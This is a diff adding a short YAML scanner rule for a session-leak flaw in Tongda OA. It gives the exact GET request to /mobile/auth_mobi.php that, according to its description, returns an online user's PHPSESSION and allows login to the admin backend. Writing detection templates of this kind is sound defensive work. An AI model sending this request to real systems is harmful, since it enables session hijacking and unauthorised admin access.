@@ -1,0 +1,12 @@
+name: 通达OA-user-session-泄露
+description: >-
+  查询在线用户,当用户在线时会返回PHPSESSION使其可登录后台系统
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /mobile/auth_mobi.php?isAvatar=1&uid=11121212121212&P_VER=0
+    expression:
+      status: 200
+      body_all:
+        - "RELOGIN"
